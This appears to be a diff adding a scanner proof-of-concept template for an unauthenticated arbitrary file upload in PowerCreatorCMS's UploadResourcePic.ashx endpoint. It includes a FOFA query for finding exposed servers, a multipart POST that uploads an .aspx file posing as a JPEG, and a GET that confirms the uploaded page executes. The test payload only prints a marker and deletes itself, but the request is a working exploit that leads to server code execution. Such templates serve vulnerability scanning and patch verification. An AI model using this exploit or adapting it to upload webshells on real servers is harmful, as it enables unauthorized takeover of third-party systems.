@@ -1,0 +1,42 @@
+id: PowerCreatorCMS-UploadResourcePic-File-upload
+
+info:
+  name: PowerCreatorCMS UploadResourcePic 任意文件上传漏洞复现
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="PowerCreator-CMS"
+    PowerCreatorCMS UploadResourcePic 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140487417
+  tags: File upload
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /upload/UploadResourcePic.ashx?ResourceID=8382
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+      body: "\
+        -----------------------------20873900192357278038549710136\r\n\
+        Content-Disposition: form-data; name=\"file1\"; filename=\"qaz.aspx\"\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <%@Page Language=\"C#\"%><%Response.Write(\"pboyjnnrfipmplsukdeczudsefxmywe\");System.IO.File.Delete(Request.PhysicalPath);%>\r\n\
+        -----------------------------20873900192357278038549710136--\r\n\
+        "
+    expression: response.status == 200 
+
+  r1:
+    request:
+      method: GET
+      path: /ResourcePic/ODM4Mg==.ASPX
+    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywe')
+
+expression: r0() && r1()
+
+
